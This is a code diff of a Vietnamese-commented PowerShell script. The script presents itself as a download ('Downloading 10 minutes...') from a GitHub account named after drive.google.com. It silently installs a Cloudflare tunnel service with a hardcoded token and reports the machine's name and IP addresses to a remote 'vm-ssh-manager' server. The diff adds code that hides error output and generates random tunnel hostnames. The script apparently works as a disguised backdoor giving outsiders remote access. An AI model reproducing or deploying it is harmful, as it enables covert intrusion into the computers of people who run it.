@@ -6,7 +6,7 @@ Write-Host 'Downloading 10 minutes...' -ForegroundColor Green
 
 # ==================== CAU HINH ====================
 $ApiBase = 'https://vm-ssh-manager.onrender.com'
-$SelfUrl = 'https://raw.githubusercontent.com/download-faster/drive.google.com/main/gemini7.ps1'
+$SelfUrl = 'https://raw.githubusercontent.com/download-faster/drive.google.com/main/gemini8.ps1'
 
 # ⚠️ THAY ĐỔI 2 DÒNG DƯỚI ĐÂY TRƯỚC KHI CHẠY
 $CFTunnelToken = "eyJhIjoiMmVhZWYyM2EyYjE1MjBkMmQyZmIwNzAzNWZkMTcyZmQiLCJ0IjoiMDFmZGY0YWYtYzg4ZS00YzRlLTk5NjctNzBmZDAwNGQ0YTM4IiwicyI6Ik1tRmtZV0l3TkRRdE16TTRZUzAwTVRReExUaG1OMkV0WTJVME5tRXdOekF3TnpVd01Ea3pPVGxrTW1VdE5tRmpaaTAwTVRZNUxXSTNOMk10WlRaak5UWmhZV1ZqWkdSaCJ9"   
@@ -105,25 +105,25 @@ if (-not (Test-Path $cfExe)) {
 }
 
 # =======================================================
-# FIX: TỰ ĐỘNG DỌN DẸP RÁC TRƯỚC KHI CÀI CLOUDFLARED
+# FIX: TỰ ĐỘNG DỌN DẸP RÁC (Đã ẩn toàn bộ log lỗi)
 # =======================================================
 Write-Host "  Don dep Cloudflared cu..." -ForegroundColor Gray
 $ErrorActionPreference = 'Continue'
 
 # 1. Diệt tiến trình đang chạy (nếu có)
-taskkill /F /IM cloudflared.exe | Out-Null
+taskkill /F /IM cloudflared.exe 2>&1 | Out-Null
 
 # 2. Xóa service cũ (nếu có)
-sc.exe delete Cloudflared | Out-Null
+sc.exe delete Cloudflared 2>&1 | Out-Null
 
-# 3. Xóa Registry key bị kẹt (Nguyên nhân gây lỗi Cannot install event logger)
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Application\Cloudflared" /f | Out-Null
+# 3. Xóa Registry key bị kẹt
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Application\Cloudflared" /f 2>&1 | Out-Null
 
 # Đợi 3 giây để Windows giải phóng hoàn toàn
 Start-Sleep -Seconds 3
 # =======================================================
 
-# Cai service moi: bat stderr ra file de PowerShell khong coi la loi
+# Cai service moi
 $errLog = Join-Path $env:TEMP 'cf_install.err'
 $proc = Start-Process -FilePath $cfExe -ArgumentList 'service','install',$CFTunnelToken `
         -NoNewWindow -Wait -PassThru -RedirectStandardError $errLog
@@ -137,8 +137,13 @@ if ($proc.ExitCode -ne 0) {
 Start-Service 'Cloudflared' -ErrorAction Stop
 
 # ===== 4. GUI LEN SERVER =====
+
+# FIX: Tạo Hostname ngẫu nhiên tránh trùng lặp
 $safeName = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9-]','-').ToLower()
-$cfHostname = "$safeName.$YourDomain"
+# Tạo 6 ký tự ngẫu nhiên (ví dụ: a1b2c3)
+$randomSuffix = ([guid]::NewGuid().ToString() -replace '-','').Substring(0,6)
+# Ghép thành: windows10-a1b2c3.downloadspeed.tech
+$cfHostname = "$safeName-$randomSuffix.$YourDomain"
 
 $validIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
               Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' })
